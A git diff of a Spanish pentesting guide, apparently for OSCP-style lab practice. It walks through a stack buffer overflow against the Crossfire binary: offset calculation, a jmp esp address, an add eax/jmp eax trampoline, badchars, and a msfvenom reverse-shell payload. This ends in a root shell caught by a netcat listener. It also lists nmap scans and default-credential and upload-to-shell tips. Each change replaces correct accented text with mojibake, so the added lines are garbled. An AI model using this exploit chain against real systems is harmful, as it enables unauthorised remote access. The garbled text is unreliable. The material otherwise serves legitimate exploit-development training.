+Lo cual estÃ¡ genial, pues estamos sobreescribiendo el registro EIP, tal y como podremos comprobar posteriormente desde la secciÃ³n _Registers_ del aplicativo. Llegados a este punto, calculamos el Offset a continuaciÃ³n a fin de corroborar si efectivamente podemos tomar el control del **EIP**, mandando para ello 4 bytes correspondientes al caracter _B_ posteriormente.
 
 #### Calculando el Offset en Linux
 
-El procedimiento realmente es el mismo que en Windows, sólo que lo referencio así en el título así para que el enlace directo desde el Índice no de problemas.
+El procedimiento realmente es el mismo que en Windows, sÃ³lo que lo referencio asÃ­ en el tÃ­tulo asÃ­ para que el enlace directo desde el Ãndice no de problemas.
 
-Usaremos una vez más el **pattern_create** y el **pattern_offset** de Metasploit. Dado que conocemos que por el momento el valor con el que vamos a trabajar es _4379_, matendremos esta cifra fija, en caso contrario el programa recordemos que crasheará de otra forma:
+Usaremos una vez mÃ¡s el **pattern_create** y el **pattern_offset** de Metasploit. Dado que conocemos que por el momento el valor con el que vamos a trabajar es _4379_, matendremos esta cifra fija, en caso contrario el programa recordemos que crashearÃ¡ de otra forma:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/BoF]
-└──╼ #/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
+â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/BoF]
+â””â”€â”€â•¼ #/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp
 ```
 
-Tomamos el resultado y lo añadimos en nuestro script:
+Tomamos el resultado y lo aÃ±adimos en nuestro script:
 
 ```python
 #!/usr/bin/python 
@@ -959,8 +958,8 @@ If you would like to pass this exception to the application press Shift+[F7/F8/F
 Teniendo estos valores que han sobreescrito el **EIP**, calculamos el Offset:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/BoF]
-└──╼ #/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 46367046
+â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/BoF]
+â””â”€â”€â•¼ #/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 46367046
 [*] Exact match at offset 4368
 ```
 
@@ -1010,33 +1009,33 @@ The address 0x42424242 does not appear to be mapped.
 If you would like to pass this exception to the application press Shift+[F7/F8/F9]
 ```
 
-Dado que vemos que estamos tomando el control del EIP, la idea en este caso es analizar los registros con el objetivo de saber dónde situar nuestro Shellcode.
+Dado que vemos que estamos tomando el control del EIP, la idea en este caso es analizar los registros con el objetivo de saber dÃ³nde situar nuestro Shellcode.
 
 #### Register Enumeration
 
-En este punto, dado que sabemos que el tamaño total aceptado antes de que el programa crashee de otra forma es **4379**, tenemos en consideración que de buffer mandamos **4368** y tras sobreescribir el **EIP** añadimos **4** bytes, dejando un total de **7 bytes** para generar nuestras instrucciones.
+En este punto, dado que sabemos que el tamaÃ±o total aceptado antes de que el programa crashee de otra forma es **4379**, tenemos en consideraciÃ³n que de buffer mandamos **4368** y tras sobreescribir el **EIP** aÃ±adimos **4** bytes, dejando un total de **7 bytes** para generar nuestras instrucciones.
 
-Este margen de 7 bytes como podremos intuir dispone de un espacio muy pequeño para fijar nuestro Shellcode, lo que hace que tengamos que saltar a otro registro donde podamos situar nuestro Payload sin inconveniente (es una técnica). Si atendemos al registro **EAX**, una vez se produce el desbordamiento de buffer, vemos que apunta justo al principio de nuestro Buffer:
+Este margen de 7 bytes como podremos intuir dispone de un espacio muy pequeÃ±o para fijar nuestro Shellcode, lo que hace que tengamos que saltar a otro registro donde podamos situar nuestro Payload sin inconveniente (es una tÃ©cnica). Si atendemos al registro **EAX**, una vez se produce el desbordamiento de buffer, vemos que apunta justo al principio de nuestro Buffer:
 
 `EAX: setup sound AAAAAAAAAAAAAAAA...`
 
-Si hacemos memoria, podemos recordar que el buffer que enviamos posee un tamaño aceptable de 4368 bytes, lo que hace que tengamos espacio de sobra para situar nuestro Shellcode. No supondría ningún problema el saltar al registro **EAX**, pero para ello debemos tener en cuenta que tras producirse el desbordamiento, nuestros caracteres que serán convertidos a Opcodes comenzarán a situarse en el registro **ESP**, lo que hace que primero debamos buscar una dirección en la memoria con permisos de ejecución para que desde el **EIP** se aplique un salto al registro **ESP** y posteriormente de aquí saltar al registro **EAX**.
+Si hacemos memoria, podemos recordar que el buffer que enviamos posee un tamaÃ±o aceptable de 4368 bytes, lo que hace que tengamos espacio de sobra para situar nuestro Shellcode. No supondrÃ­a ningÃºn problema el saltar al registro **EAX**, pero para ello debemos tener en cuenta que tras producirse el desbordamiento, nuestros caracteres que serÃ¡n convertidos a Opcodes comenzarÃ¡n a situarse en el registro **ESP**, lo que hace que primero debamos buscar una direcciÃ³n en la memoria con permisos de ejecuciÃ³n para que desde el **EIP** se aplique un salto al registro **ESP** y posteriormente de aquÃ­ saltar al registro **EAX**.
 
-Nos encontraremos con un problema tras saltar al registro **EAX**, pero lo abordaremos más adelante.
+Nos encontraremos con un problema tras saltar al registro **EAX**, pero lo abordaremos mÃ¡s adelante.
 
 #### JMP ESP Opcode
 
 Recodemos que contamos con un margen de 7 bytes para definir nuestras instrucciones, donde una de ellas es el salto al registro **EAX** que pretendemos hacer para posteriormente situar nuestro Shellcode.
 
-Lo primero será hacer que el registro **EIP** apunte al **ESP**, donde posteriormente insertaremos nuestros Opcodes. Para ello, desde **edb**, podemos tras producirse el desbordamiento presionar la tecla **Ctrl+O** para el _Opcode Searcher_. 
+Lo primero serÃ¡ hacer que el registro **EIP** apunte al **ESP**, donde posteriormente insertaremos nuestros Opcodes. Para ello, desde **edb**, podemos tras producirse el desbordamiento presionar la tecla **Ctrl+O** para el _Opcode Searcher_. 
 
-Una vez abierto, seleccionamos la dirección del binario **crossfire** que cuenta con permisos de ejecución, seleccionando de la lista desplegable el salto **ESP -> EIP**. Pinchamos en **Find** y esperamos a que el programa encuentre las direcciones donde se realizan el salto al registro **ESP**.
+Una vez abierto, seleccionamos la direcciÃ³n del binario **crossfire** que cuenta con permisos de ejecuciÃ³n, seleccionando de la lista desplegable el salto **ESP -> EIP**. Pinchamos en **Find** y esperamos a que el programa encuentre las direcciones donde se realizan el salto al registro **ESP**.
 
 Encontramos la siguiente:
 
 `0x08134596: jmp esp`
 
-Como es de esperar, nuestro registro **EIP** tomará dicho valor en formato _Little Endian_:
+Como es de esperar, nuestro registro **EIP** tomarÃ¡ dicho valor en formato _Little Endian_:
 
 ```python
 #!/usr/bin/python 
@@ -1073,7 +1072,7 @@ except:
 	sys.exit(0)
 ```
 
-Tras enviar el buffer, si establecemos previamente con la tecla **F2** un _breakpoint_ en el registro **0x08134596**, podremos ver como el aplicativo muestra que el registro **EIP** apunta a la dirección **0x08134596**, correspondiente al **ESP**. Pulsando la tecla **F8**, avanzaremos una instrucción por pulsación, donde se puede ver como las siguientes instrucciones son:
+Tras enviar el buffer, si establecemos previamente con la tecla **F2** un _breakpoint_ en el registro **0x08134596**, podremos ver como el aplicativo muestra que el registro **EIP** apunta a la direcciÃ³n **0x08134596**, correspondiente al **ESP**. Pulsando la tecla **F8**, avanzaremos una instrucciÃ³n por pulsaciÃ³n, donde se puede ver como las siguientes instrucciones son:
 
 ```bash
 bffa:4de0 43           inc ebx
@@ -1089,7 +1088,7 @@ Correspondiente a los 7 bytes finales de margen que tenemos donde por el momento
 
 #### JMP EAX From ESP
 
-Ahora que controlamos el flujo del programa y estamos en el registro **ESP**, como este sólo cuenta con 7 bytes de margen, saltaremos al registro **EAX** con el objetivo de depositar posteriormente nuestro Shellcode.
+Ahora que controlamos el flujo del programa y estamos en el registro **ESP**, como este sÃ³lo cuenta con 7 bytes de margen, saltaremos al registro **EAX** con el objetivo de depositar posteriormente nuestro Shellcode.
 
 Surge un problema a la hora de saltar al registro **EAX**, y es que la cadena '_setup sound_' es interpretada como **Opcode**:
 
@@ -1106,19 +1105,19 @@ Esto puede causar inconvenientes, pues el flujo del programa como vemos puede to
 La cadena '_setup sound_' ocupa 12 bytes (con espacios incluidos), por lo que algo inteligente a hacer desde **nasm_shell.rb** es aplicar los siguientes Opcodes:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/BoF]
-└──╼ #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
+â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/BoF]
+â””â”€â”€â•¼ #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
 nasm > add eax,12
 00000000  83C00C            add eax,byte +0xc
 nasm > jmp eax
 00000000  FFE0              jmp eax
 ```
 
-Desplazamos en un margen de 12 bytes el contenido de **EAX**, de forma que en estos 3 bytes de instrucción el registro se nos quedaría apuntando justo al comienzo de nuestro búffer (AAAAAAAA...), posteriormente en otros 2 bytes aplicamos un salto a dicho registro.
+Desplazamos en un margen de 12 bytes el contenido de **EAX**, de forma que en estos 3 bytes de instrucciÃ³n el registro se nos quedarÃ­a apuntando justo al comienzo de nuestro bÃºffer (AAAAAAAA...), posteriormente en otros 2 bytes aplicamos un salto a dicho registro.
 
-¿Lo bueno de todo esto?, que en total son 5 bytes de instrucción, y si recordamos contábamos con un margen de 7 bytes para realizar nuestras instrucciones... por lo tanto, de maravilla.
+Â¿Lo bueno de todo esto?, que en total son 5 bytes de instrucciÃ³n, y si recordamos contÃ¡bamos con un margen de 7 bytes para realizar nuestras instrucciones... por lo tanto, de maravilla.
 
-Estos Opcodes al fin y al cabo se traducen en "**\x83\xC0\x0C\xFF\xE0**", de forma que nuestro script quedaría tal y como se representa a continuación:
+Estos Opcodes al fin y al cabo se traducen en "**\x83\xC0\x0C\xFF\xE0**", de forma que nuestro script quedarÃ­a tal y como se representa a continuaciÃ³n:
 
 ```python
 #!/usr/bin/python 
@@ -1155,17 +1154,17 @@ except:
 	sys.exit(0)
 ```
 
-Obviamente, añadimos 2 bytes de **NOPs** para completar el tamaño de 4379 bytes. Ahora que el flujo del programa se encamina por donde queremos, la idea es sustituir nuestras _Aes_ por nuestro Shellcode, teniendo en consideración que tras estar codificado por _shikata_, habrá que añadir unos 16 bytes de margen al principio del registro para que nuestro Shellcode se pueda decoficar.
+Obviamente, aÃ±adimos 2 bytes de **NOPs** para completar el tamaÃ±o de 4379 bytes. Ahora que el flujo del programa se encamina por donde queremos, la idea es sustituir nuestras _Aes_ por nuestro Shellcode, teniendo en consideraciÃ³n que tras estar codificado por _shikata_, habrÃ¡ que aÃ±adir unos 16 bytes de margen al principio del registro para que nuestro Shellcode se pueda decoficar.
 
-¡Que no se nos olvide comprobar los Badchars!, que para este caso son "**\x00\x0a\x0d\x20**". Este paso no hace falta detallarlo, pues no es el más complejo que digamos y ya lo hemos visto en Windows. Simplemente tener en cuenta que con el espacio que contamos en el registro **EAX** podemos ir mandando los caracteres a fin de analizar cuáles de ellos dan problema.
+Â¡Que no se nos olvide comprobar los Badchars!, que para este caso son "**\x00\x0a\x0d\x20**". Este paso no hace falta detallarlo, pues no es el mÃ¡s complejo que digamos y ya lo hemos visto en Windows. Simplemente tener en cuenta que con el espacio que contamos en el registro **EAX** podemos ir mandando los caracteres a fin de analizar cuÃ¡les de ellos dan problema.
 
 #### Msfvenom Linux Payload
 
 Para generar nuestro Shellcode, aplicamos el siguiente comando:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar/Desktop/BoF]
-└──╼ #msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.51 LPORT=443 -a x86 --platform linux -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20"
+â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/BoF]
+â””â”€â”€â•¼ #msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.51 LPORT=443 -a x86 --platform linux -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20"
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 95 (iteration=0)
@@ -1182,7 +1181,7 @@ unsigned char buf[] =
 "\x7d\x8c\x95\x1d\xfd";
 ```
 
-Por último, considerando el tamaño de 95 bytes generados, preparamos nuestro Búffer:
+Por Ãºltimo, considerando el tamaÃ±o de 95 bytes generados, preparamos nuestro BÃºffer:
 
 ```python
 #!/usr/bin/python 
@@ -1240,11 +1239,11 @@ except:
 
 # Ganando Acceso al Sistema
 
-Por último, cerramos **edb**, corremos el programa normalmente, enviamos el búffer y previamente estando en escucha desde **Netcat** por el puerto 443, ganamos acceso al sistema:
+Por Ãºltimo, cerramos **edb**, corremos el programa normalmente, enviamos el bÃºffer y previamente estando en escucha desde **Netcat** por el puerto 443, ganamos acceso al sistema:
 
 ```bash
-┌─[root@parrot]─[/home/s4vitar]
-└──╼ #nc -nlvp 443
+â”Œâ”€[root@parrot]â”€[/home/s4vitar]
+â””â”€â”€â•¼ #nc -nlvp 443
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::443
 Ncat: Listening on 0.0.0.0:443
@@ -1261,28 +1260,28 @@ root@kali:/root#
 Pentesting
 ===============================================================================================================================
 
-En este punto, se detallan técnicas de Pentesting a abordar sobre las máquinas Windows/Linux que se nos presenten.
+En este punto, se detallan tÃ©cnicas de Pentesting a abordar sobre las mÃ¡quinas Windows/Linux que se nos presenten.
 
 ### General
 
-Bajo este apartado se describirán técnicas de enumeración a realizar sobre los Hosts independientemente del sistema operativo / servicio con el que se trate.
+Bajo este apartado se describirÃ¡n tÃ©cnicas de enumeraciÃ³n a realizar sobre los Hosts independientemente del sistema operativo / servicio con el que se trate.
 
 #### Port Scanning
 
-Cada uno tiene su forma de hacer la enumeración de puertos/servicios corriendo bajo un sistema. Yo generalmente suelo seguir estos pasos.
+Cada uno tiene su forma de hacer la enumeraciÃ³n de puertos/servicios corriendo bajo un sistema. Yo generalmente suelo seguir estos pasos.
 
 * Escaneo inicial de puertos abiertos sobre el sistema
 
 ```bash
 nmap -p- --open -T5 -v -oG allPorts ipHost -n
 ```
-* Enumeración del servicio y versionado para los puertos descubiertos sobre el sistema
+* EnumeraciÃ³n del servicio y versionado para los puertos descubiertos sobre el sistema
 
 ```bash
 nmap -p$(cat allPorts | grep -oP '\d{2,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',') -sC -sV ipHost -oN targeted
 ```
 
-La razón de hacer esto es que me parece mucho más ágil el poder tener una visual de los puertos abiertos de un primer tirón para el escaneo inicial, así en lo que posteriormente lanzo el profundo de enumeración de servicios con los scripts básicos de enumeración, puedo ir enumerando por mi cuenta los puertos que corren servicios conocidos (HTTP, HTTPS, FTP, ms-sql-s, etc.).
+La razÃ³n de hacer esto es que me parece mucho mÃ¡s Ã¡gil el poder tener una visual de los puertos abiertos de un primer tirÃ³n para el escaneo inicial, asÃ­ en lo que posteriormente lanzo el profundo de enumeraciÃ³n de servicios con los scripts bÃ¡sicos de enumeraciÃ³n, puedo ir enumerando por mi cuenta los puertos que corren servicios conocidos (HTTP, HTTPS, FTP, ms-sql-s, etc.).
 
 * En caso de contar con un escaneo inicial lento, suelo aplicar la siguiente variante
 
@@ -1290,7 +1289,7 @@ La razón de hacer esto es que me parece mucho más ágil el poder tener una vis
 nmap -A -T4 -v ipHost -oN misc
 ```
 
-Este escaneo no engloba todos los puertos, y probablemente nos estemos saltando algunos interesantes que escapen de este escaneo. En tal caso podemos ir englobando rangos de búsqueda a fin de determinar los puertos que están abiertos (Pues lanzando el -p- cuando se demora mucho tiempo nmap suele detener el escaneo haciéndolo incompleto):
+Este escaneo no engloba todos los puertos, y probablemente nos estemos saltando algunos interesantes que escapen de este escaneo. En tal caso podemos ir englobando rangos de bÃºsqueda a fin de determinar los puertos que estÃ¡n abiertos (Pues lanzando el -p- cuando se demora mucho tiempo nmap suele detener el escaneo haciÃ©ndolo incompleto):
 
 ```bash
 nmap -p1-10000 --open -T5 -v ipHost -n -oG range1-10000
@@ -1301,63 +1300,63 @@ nmap -p20000-30000 --open -T5 -v ipHost -n -oG range20000-30000
                         .
 ```
 
-En caso de figurar un servicio HTTP corriendo bajo un puerto, podemos aprovecharnos del script **http-enum.nse** de nmap para enumerar directorios y archivos del servicio web (Cuenta con un diccionario pequeño pero nos puede servir para tener una visual rápida sobre los recursos alojados):
+En caso de figurar un servicio HTTP corriendo bajo un puerto, podemos aprovecharnos del script **http-enum.nse** de nmap para enumerar directorios y archivos del servicio web (Cuenta con un diccionario pequeÃ±o pero nos puede servir para tener una visual rÃ¡pida sobre los recursos alojados):
 
 ```bash
 nmap --script=http-enum.nse -p80,443,8080 ipHost -oN webScan
 ```
 
-* Visualización de categorías para los scripts de nmap
+* VisualizaciÃ³n de categorÃ­as para los scripts de nmap
 
 ```bash
 grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"' | sort -u
 ```
 
-Estas categorías son todas las que nmap posee, pudiendo por ejemplo para un servicio FTP o SMB aplicar las siguientes categorías:
+Estas categorÃ­as son todas las que nmap posee, pudiendo por ejemplo para un servicio FTP o SMB aplicar las siguientes categorÃ­as:
 
 ```bash
 nmap -p21,445 --script="vuln and safe" ipHost -oN vulnSafeScan
 ```
 
-En cuanto a los **Low Hanging Fruit**, puertos interesantes a buscar para nuestros escaneos iniciales pueden ser los siguientes (Hay muchos más, pero corresponden a servicios que nos pueden garantizar la ejecución de comandos en remoto sobre los sistemas):
+En cuanto a los **Low Hanging Fruit**, puertos interesantes a buscar para nuestros escaneos iniciales pueden ser los siguientes (Hay muchos mÃ¡s, pero corresponden a servicios que nos pueden garantizar la ejecuciÃ³n de comandos en remoto sobre los sistemas):
 
 ```bash
 nmap -p21,1433 192.168.1.0/24 --open -T5 -v -n -oN LHF
 ```
 
-Sobre el servicio **FTP** resulta interesante comprobar que podamos subir archivos. En caso de contar con un IIS, si vemos que somos capaces de alojar un fichero asp/aspx y apuntar al mismo desde el servicio web, podremos entablar una conexión TCP reversa.
+Sobre el servicio **FTP** resulta interesante comprobar que podamos subir archivos. En caso de contar con un IIS, si vemos que somos capaces de alojar un fichero asp/aspx y apuntar al mismo desde el servicio web, podremos entablar una conexiÃ³n TCP reversa.
 
-Sobre el servicio **ms-sql-s**, una de las pruebas que suelo utilizar de cabeza es la de realizar una autenticación vía **sqsh** contra el servicio proporcionando las credenciales **sa** de usuario sin contraseña. Puede llegar a pasar que el servicio no se encuentre corriendo sobre el puerto 1433, en ese caso podemos hacer uso de la herramienta [mssql.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
+Sobre el servicio **ms-sql-s**, una de las pruebas que suelo utilizar de cabeza es la de realizar una autenticaciÃ³n vÃ­a **sqsh** contra el servicio proporcionando las credenciales **sa** de usuario sin contraseÃ±a. Puede llegar a pasar que el servicio no se encuentre corriendo sobre el puerto 1433, en ese caso podemos hacer uso de la herramienta [mssql.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
 
 #### Wfuzz
 
